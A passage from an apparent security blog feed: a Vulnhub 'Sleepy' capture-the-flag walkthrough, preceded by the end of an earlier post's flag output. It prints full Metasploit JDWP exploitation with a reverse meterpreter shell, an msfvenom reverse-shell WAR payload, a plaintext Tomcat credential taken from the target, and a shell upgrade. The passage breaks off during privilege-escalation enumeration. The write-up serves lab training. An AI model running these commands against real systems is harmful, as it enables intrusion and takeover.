</span><span class='line'>                                                               .AMMMMn.   MM&lt;/code>&lt;/em>YMMY&lt;em>ccaM&lt;/em>
</span><span class='line'>                                                              dM&lt;em>  &lt;/em>YMMb  YP        `cMY
</span><span class='line'>                                                              YM.  .dMMP   aMn.     .cMP
</span><span class='line'>                                                               &lt;em>YMMn.     aMMMMMMMMMMMY'
</span><span class='line'>                                                                .&lsquo;YMMb.           ccMP
</span><span class='line'>                                                             .dMcccccc&lt;/em>Mc&hellip;.cMb.cMP&rsquo;
</span><span class='line'>                                                           .dMMMMb;cccc&lt;em>Mbcccc,IMMMMMMMn.
</span><span class='line'>                                                          dY&lt;/em>&lsquo;  &rsquo;&lt;em>M;ccccMM..dMMM..MP&lt;/em>cc&lt;em>Mb
</span><span class='line'>                                                          YM.    ,MbccMMMMMMMMMMMM&lt;/em>cccc;MP
</span><span class='line'>                                                           &lt;em>Mbn;adMMMMMMMMMMMMMMMIcccc;M&lt;/em>
</span><span class='line'>                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
</span><span class='line'>                                                          Yb;cc;dMMMMMMMMMMMP&lt;em>&lsquo;  &lt;/em>YMMP&lt;em>
</span><span class='line'>                                                           &lt;/em>YMMMPYMMMMMMP*&rsquo;          curchack
</span><span class='line'>                                                       +####################################+
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       |======                            | |
</span><span class='line'>                                                       +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+-+
</span><span class='line'>                                                        ####################################
</span><span class='line'>                                                             |======                  |
</span><span class='line'>                                                             |======                  |
</span><span class='line'>                                                             |=====                   |
</span><span class='line'>                                                             |====                    |
</span><span class='line'>                                                             |                        |
</span><span class='line'>                                                             +                        +&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> .d8888b.                 d8b          d8b               888                                                                    d8b
</span><span class='line'>d88P  Y88b                Y8P          88P               888                                                                    Y8P
</span><span class='line'>888    888                             8P                888
</span><span class='line'>888        .d88b.  .d8888b888   88888b.&ldquo;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
</span><span class='line'>888       d8P  Y8bd88P&rdquo;   888   888 &ldquo;88b d8P  Y8b88K     888      888 "88b    "88b88K        888  888888 "88bd8P  Y8b   888 "88b888888 "88bd8P  Y8b
</span><span class='line'>888    88888888888888     888   888  888 88888888"Y8888b.888      888  888.d888888"Y8888b.   888  888888  88888888888   888  888888888  88888888888
</span><span class='line'>Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
</span><span class='line'> "Y8888P&rdquo;  &ldquo;Y8888  "Y8888P888   888  888  "Y8888  88888P' "Y888   88888P&rdquo; &ldquo;Y888888 88888P'    "Y88888888  888 "Y8888    88888P&rdquo; 88888888P"  &ldquo;Y8888Y8P
</span><span class='line'>                                                                  888                                                   888        888
</span><span class='line'>                                                                  888                                                   888        888
</span><span class='line'>                                                                  888                                                   888        888
</span><span class='line'>Well Done!
</span><span class='line'>Here&rsquo;s your flag: 0089cd4f9ae79402cdd4e7b8931892b7</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Sleepy]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/11/13/vulnhub-sleepy/"/>
    <updated>2015-11-13T00:44:46-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/11/13/vulnhub-sleepy</id>
    <content type="html"><![CDATA[<p><strong>/dev/random: Sleepy</strong> is the latest one in the series <strong>/dev/random</strong>, which is created by <a href="https://www.vulnhub.com/author/sagi-,36/">Sagi-</a>.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">here</a>.</p>

<!-- more -->


<p><img class="left" src="/downloads/sleepy/sleepy.png"></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: /dev/random: Sleepy (<em>10.1.1.142/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Analysed and found vulnerable application / service (JDWP running on port 9001) and the vulnerability is <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger" title="JDWP Remote Code Execution"><strong>Java Debug Wire Protocol Remote Code Execution</strong></a></li>
<li>Exploit JDWP vulnerability and get shell with limited &lsquo;sleepy&rsquo; privilege</li>
<li>Searching and find Tomcat&rsquo;s admin login credential which stored in the default file: <font color="green"><em>/etc/tomcat/tomcat-users.xml</em></font></li>
<li>Set up Kali and log in to Tomcat manager page with admin priviledge, then generate, upload and deploy the evil WAR file to target server</li>
<li>Set up MSF and then get a reverse shell back by accessing the evil page I deployed previously, now we get a new shell with the priviledge of &lsquo;tomcat&rsquo;</li>
<li>Enumerating and find vulnerable binary &lsquo;/usr/bin/nightmare&rsquo; which has sticky bit set and belong to ROOT group.</li>
<li>Analysed and exploit &lsquo;/usr/bin/nightmare&rsquo; to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Search and found JDWP remote code vulnerability which can be exploited to get shell</li>
<li>Enumerate and found tomcat&rsquo;s login configuration file in the default location (/etc/tomcat/tomcat-users.xml)</li>
<li>Set up Kali2 and log in to Tomcat&rsquo;s manager page with the credential found previously</li>
<li>Generate evil WAR file by using <strong>msfvenom</strong>, then upload and deploy on Tomcat server</li>
<li>Set up MSF console and trigging the reverse shell by accessing the evil page deployed before [<font color="FF8000">Metasploit</font>]</li>
<li>With the priveilege of tomcat, enumerate and find vulnerable binary <code>/usr/bin/nightmare</code> which has sticky bit set and in ROOT group</li>
<li>Download <code>/usr/bin/nightmare</code> to local, analyse with <code>radare2</code> and exploit it to get ROOT [<font color="FF8000">radare2</font>]</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="https://github.com/radare/radare2">radare2</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.142 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.142  00:0c:29:0b:18:9f   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:ed:31:70   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;6 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.529 seconds <span class="o">(</span>101.23 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.142 is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.142/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2015-11-06 09:49:16 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8009/tcp on 10.1.1.142                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 21/tcp on 10.1.1.142                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 9001/tcp on 10.1.1.142 &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Now there are 3 ports (21, 8009, 9001) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA4 scan initiated Fri Nov  <span class="m">6</span> 04:51:36 <span class="m">2015</span> as: nmap -sV -v -A -T4 -O -p 8009,21,9001 -oN 10.1.1.142_nmap.txt 10.1.1.142&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.142
</span><span class='line'>Host is up <span class="o">(</span>0.00063s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>21/tcp   open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t get directory listing: TIMEOUT
</span><span class='line'>8009/tcp open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
</span><span class='line'>9001/tcp open  jdwp    Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
</span><span class='line'>MAC Address: 00:0C:29:0B:18:9F <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
</span><span class='line'>Uptime guess: 0.002 days <span class="o">(</span>since Fri Nov  <span class="m">6</span> 04:49:25 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>I checked the FTP first and from the <code>nmap</code> scanning result, Anonymous login allowed. However, there is only one PNG file (sleepy.png) in <code>pub</code> folder and there is no permission to upload file through anonymous account. Nothing can be found in the PNG file, so I move on.</p>

<p>Next is port 8009, ajp13 Apache JServ. This <a href="http://insight-labs.org/?p=1095" title="Exploit on Tomcat with AJP">blog</a> described a method to exploit Tomcat with AJP protocol. The good news is that I can touch the login page of Tomcat manager. However, after several failed trials, I still could not manage the login credential. Have to leave it for now and move on :(</p>

<p>The third open port is 9001 which Java Debug Wire Protocol is running on it. By searching online for any exist exploit, I found this <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger" title="JDWP Remote Code Execution">JDWP Remote Code Execution</a>.</p>

<p>Then I startup Metasploit console and get a reverse shell with this JDWP exploit:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; search jdwp
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Module database cache not built yet, using slow search&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Matching Modules&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name                                   Disclosure Date  Rank  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   exploit/multi/misc/java_jdwp_debugger  2010-03-12       good  Java Debug Wire Protocol Remote Code Execution&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf &gt; use exploit/multi/misc/java_jdwp_debugger
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>RHOST 10.1.1.142
</span><span class='line'><span class="nv">RHOST</span> <span class="o">=</span>&gt; 10.1.1.142
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>RPORT 9001
</span><span class='line'><span class="nv">RPORT</span> <span class="o">=</span>&gt; 9001
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; <span class="nb">set </span>LHOST 10.1.1.130
</span><span class='line'><span class="nv">LHOST</span> <span class="o">=</span>&gt; 10.1.1.130
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; check
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 10.1.1.142:9001 - The target appears to be vulnerable.
</span><span class='line'>msf exploit<span class="o">(</span>java_jdwp_debugger<span class="o">)</span> &gt; exploit&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse handler on 10.1.1.130:4444
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 10.1.1.142:9001 - Retrieving the sizes of variable sized data types in the target VM<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> 10.1.1.142:9001 - Getting the version of the target VM<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 10.1.1.142:9001 - Getting all currently loaded classes by the target VM<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> 10.1.1.142:9001 - Getting all running threads in the target VM<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 10.1.1.142:9001 - Setting <span class="p">&amp;</span>lsquo<span class="p">;</span>step into<span class="p">&amp;</span>rsquo<span class="p">;</span> event<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> 10.1.1.142:9001 - Resuming VM and waiting <span class="k">for</span> an event<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 10.1.1.142:9001 - Received <span class="m">1</span> responses that are not a <span class="p">&amp;</span>lsquo<span class="p">;</span>step into<span class="p">&amp;</span>rsquo<span class="p">;</span> event<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> 10.1.1.142:9001 - Deleting step event<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> 10.1.1.142:9001 - Disabling security manager <span class="k">if</span> <span class="nb">set</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> 10.1.1.142:9001 - Security manager was not <span class="nb">set</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> 10.1.1.142:9001 - Dropping and executing payload<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Transmitting intermediate stager <span class="k">for</span> over-sized stage<span class="p">&amp;</span>hellip<span class="p">;</span><span class="o">(</span><span class="m">105</span> bytes<span class="o">)</span>
</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1495598</span> bytes<span class="o">)</span> to 10.1.1.142
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:4444 -&gt; 10.1.1.142:35957<span class="o">)</span> at 2015-11-06 08:08:24 -0500
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Deleted /tmp/zNfkVK&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;meterpreter &gt; sysinfo
</span><span class='line'>Computer     : sleepy
</span><span class='line'>OS           : Linux sleepy 3.10.0-123.13.2.el7.x86_64 <span class="c">#1 SMP Thu Dec 18 14:09:13 UTC 2014 (x86_64)</span>
</span><span class='line'>Architecture : x86_64
</span><span class='line'>Meterpreter  : x86/linux
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">2878</span> created.
</span><span class='line'>Channel <span class="m">1</span> created.
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-4.2<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>sleepy<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:initrc_t:s0
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool~ Now I get in as user <code>sleepy</code>!</p>

<p>Next thing is to find login credential of Tomcat manager page.</p>

<p>After poking around in the file system, I found the default Tomcat users file <code>/etc/tomcat/tomcat-users.xml</code>:</p>

<p>File /etc/tomcat/tomcat-users.xml could not be found</p>

<p>At the bottom of the xml file, I found the tomcat login credential in plaintext: <code>sl33py / Gu3SSmYStR0NgPa$sw0rD!</code>!</p>

<p>Now, we are on the right track and the next thing is getting clear:</p>

<p>Run <code>msfvenom</code> as follow to generate evil WAR file with reverse shell payload.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;create evil WAR file with reverse shell payload&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.1.1.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">8888</span> -f war &gt; sleepy.war&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;check the WAR file and note the evil page: atodruyscupc.jsp&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~# jar -xvf sleepy.war
</span><span class='line'> inflated: META-INF/MANIFEST.MF
</span><span class='line'>  created: WEB-INF/
</span><span class='line'> inflated: WEB-INF/web.xml
</span><span class='line'> inflated: atodruyscupc.jsp
</span><span class='line'> inflated: VFTwyDWxQug.txt
</span></code></pre></td></tr></table></div></figure></p>

<p>After upload and deployed the WAR file on target Tomcat server, I set up Metasploit console and access the target page <code>http://10.1.1.130/sleepy/atodruyscupc.jsp</code> to get a shell back as user <code>tomcat</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; show options&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name  Current Setting  Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Payload options <span class="o">(</span>linux/x86/meterpreter/reverse_tcp<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name          Current Setting  Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   DebugOptions  <span class="m">0</span>                no        Debugging options <span class="k">for</span> POSIX meterpreter
</span><span class='line'>   LHOST         10.1.1.130       yes       The listen address
</span><span class='line'>   LPORT         <span class="m">8888</span>             yes       The listen port&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Exploit target:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Id  Name&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="m">0</span>   Wildcard Target&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>ExitOnSession <span class="nb">false</span>
</span><span class='line'><span class="nb"> </span><span class="nv">ExitOnSession</span> <span class="o">=</span>&gt; <span class="nb">false</span>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit -j -z
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exploit running as background job.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse handler on 10.1.1.130:8888
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Starting the payload handler<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.1.1.130:8888 -&gt; 10.1.1.142:38614<span class="o">)</span> at 2015-11-06 22:07:09 -0500&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>bash-4.2<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
</span><span class='line'>bash-4.2<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/usr/share/tomcat
</span><span class='line'>bash-4.2<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now we have escaped priviledge to <code>tomcat</code> successfully!</p>

<p>After enmueration (<a href="https://blog.g0tmi1k.com/">g0tmi1k</a> has made a really helpful guide for enumerating and you can find it <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" title="Basic Linux Privilege Escalation">here</a>), I found one suspected binary file <code>/usr/bin/nightmare</code> which has sticky bit set and belong to ROOT group.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
